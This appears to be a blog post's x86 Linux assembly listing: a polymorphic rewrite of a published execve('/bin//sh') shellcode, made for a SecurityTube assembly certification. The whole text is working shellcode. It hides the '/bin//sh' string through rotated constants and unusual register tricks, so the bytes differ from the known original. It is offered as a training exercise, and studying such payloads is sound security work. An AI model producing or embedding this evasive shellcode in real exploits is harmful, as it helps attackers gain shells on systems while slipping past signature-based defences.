; orig shellcode: http://shell-storm.org/shellcode/files/shellcode-841.php
; morphed version by Sandro "guly" Zaccarini

global _start
section .text
_start:
; xor ecx,ecx
pushfd
pop   ecx
and   ecx, 1
; zero eax and edx
mul    ecx

mov    al,0xb
push   ecx

; obfuscate /bin//sh
; mov ebx,0x68732f2f
; ror ebx,1
; to have 0xb4399797
mov ebx,0xb4399797
rol ebx,1
push ebx

; mov ebx,0x6e69622f
; rol ebx,1
; to have 0xdcd2c45e
mov ebx,0xdcd2c45e
ror ebx,1

; push ebx
sub esp,0x4
mov [esp],ebx

mov    ebx,esp
int    0x80

; original length: 21
; current length: 35
; total save: -14 but i liked this morphism!
;
; This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
